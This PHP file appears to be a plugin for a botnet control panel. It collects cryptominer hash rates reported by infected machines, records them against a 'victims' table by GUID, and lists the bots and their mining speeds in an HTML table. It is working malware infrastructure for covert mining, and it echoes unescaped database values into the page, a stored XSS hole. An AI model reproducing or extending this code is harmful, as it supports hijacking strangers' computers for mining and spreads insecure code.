<?php

class main
{
    private $MySQL;
    private $PluginName;

    public function __construct()
    {
        include('info.php');

        $this->MySQL = new MySQL(HOST, USER, PASS, DB);
        $this->PluginName = str_replace(' ', '', trim(strtolower($PLUGIN_NAME)));
    }

    /*
     * Run plugin
     */
    public function run()
    {
        $code = '<table id="tablecss"><tr><th>GUID</th><th>Hash Rate</th><th>Creation Date</th></tr>';

        $this->MySQL->doQuery('SELECT GUID, hashspeed,creationDate, HEX(GUID) AS GUIDString FROM `plugin_' . $this->PluginName . '`');
        $i = 0;
        while ($pwgrabber = $this->MySQL->arrayResult()) {
            foreach ($pwgrabber as $key => $value) {
                $task[$key] = htmlentities($pwgrabber[$key]);
            }

            $class = ($i % 2) ? 'alt' : '';
            $code .= '<tr class="' . $class . '"><td>' . $pwgrabber['GUIDString'] . '</td><td>' . $pwgrabber['hashspeed'] . '</td>';



            $code .= '<td>' . $pwgrabber['creationDate'] . '</td>';

            $code .= '</tr>';
            $i++;
        }

        $code .= '</table>';
        return $code;
    }

    /*
     * Insert data
     */

    public function insertData()
    {
        define('MINER_HASHSPEED_PARAM', 'ca');


        if (isset($_POST[MINER_HASHSPEED_PARAM]) == TRUE) {
            //Get post data
            $data = array('guid' => $_POST[POST_PARAM_GUID], 'hashspeed' => $_POST[MINER_HASHSPEED_PARAM]);

            //Security
            foreach ($data as $key => $value) {
                $data[$key] = $this->MySQL->escapeString($data[$key]);
            }
			
			$paramhashspeed = $this->MySQL->escapeString(base64_decode($data['hashspeed']));

            $this->MySQL->doQuery('INSERT INTO `plugin_' . $this->PluginName . '` (`GUID`, `hashspeed`, `creationDate`) VALUES (UNHEX(\'' . $data['guid'] . '\'), \'' . $paramhashspeed . '\', NOW()) ON DUPLICATE KEY UPDATE `hashspeed` = \'' . $paramhashspeed . '\';');
			$this->MySQL->doQuery('UPDATE `victims` SET HashRate = \'' . $paramhashspeed . '\' WHERE GUID = \'' . $data['guid'] . '\'');
        }
    }
}